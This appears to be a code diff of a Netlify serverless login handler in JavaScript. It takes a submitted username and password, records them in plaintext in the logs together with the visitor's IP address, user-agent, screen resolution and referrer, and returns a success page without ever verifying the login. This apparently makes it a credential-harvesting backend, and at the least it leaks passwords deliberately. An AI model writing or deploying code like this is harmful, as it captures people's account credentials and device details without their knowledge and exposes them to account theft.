@@ -1,5 +1,4 @@
 exports.handler = async (event, context) => {
-  // Only accept POST requests
   if (event.httpMethod !== "POST") {
     return {
       statusCode: 405,
@@ -20,33 +19,22 @@ exports.handler = async (event, context) => {
   const username = formData.username || "";
   const password = formData.password || "";
 
-  // Get additional data from frontend
+  // Get IP and User-Agent from Netlify headers
   const ipAddress = event.headers["x-forwarded-for"] || "Unknown IP";
-  const userAgent = event.headers["user-agent"] || "Unknown User-Agent";
-  const operatingSystem = formData.os || "Unknown OS";
-  const deviceType = formData.device || "Unknown Device";
-  const screenResolution = formData.resolution || "Unknown Resolution";
-  const location = formData.location || "Unknown Location";
-  const isp = formData.isp || "Unknown ISP";
-  const referralURL = formData.referrer || "Unknown Referrer";
-  const loginTimestamp = new Date().toISOString();
+  const userAgent = formData.userAgent || "Unknown User-Agent";
+  const screenResolution = formData.screenResolution || "Unknown Resolution";
+  const referrer = formData.referrer || "Unknown Referrer";
 
-  // Log collected data (This will appear in Netlify logs)
-  console.log("Login attempt:", {
+  // Log everything for debugging
+  console.log("Login Attempt:", {
     username,
     password,
     ipAddress,
     userAgent,
-    operatingSystem,
-    deviceType,
     screenResolution,
-    location,
-    isp,
-    referralURL,
-    loginTimestamp,
+    referrer,
   });
 
-  // Return an HTML success page
   return {
     statusCode: 200,
     headers: { "Content-Type": "text/html" },
